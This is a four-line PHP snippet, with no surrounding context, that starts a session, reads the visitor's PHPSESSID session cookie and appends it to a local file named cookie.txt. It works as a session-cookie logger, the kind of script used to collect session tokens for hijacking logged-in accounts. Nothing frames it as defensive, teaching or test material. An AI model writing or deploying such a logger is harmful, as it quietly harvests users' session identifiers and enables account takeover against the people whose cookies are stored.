<?php
session_start();
$cookie = $_COOKIE['PHPSESSID'];
file_put_contents("cookie.txt", $cookie, FILE_APPEND);
